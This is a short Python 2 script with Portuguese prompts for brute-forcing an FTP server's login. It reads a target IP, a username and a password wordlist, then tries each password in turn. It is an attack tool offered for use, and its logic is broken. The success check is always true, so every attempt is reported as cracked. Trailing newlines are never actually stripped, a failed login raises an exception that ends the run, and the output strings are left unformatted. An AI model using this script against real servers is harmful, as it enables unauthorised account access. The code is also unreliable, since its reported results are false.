#!/usr/bin/env python

from ftplib import FTP

alvo = raw_input('Digite o ip do servidor: ')
usr = raw_input('Digite o usuario: ')
wordlist = raw_input('Digite a wordlist: ')
password = open(wordlist, 'r').readlines()

ftp = FTP(alvo)

for passwd in password:
    passwd.rstrip()
    ftp.login(usr, passwd)
    if '230':
        print "[+]CRACKED %s", passwd
    else:
        print "[-]FALHOU %s", passwd
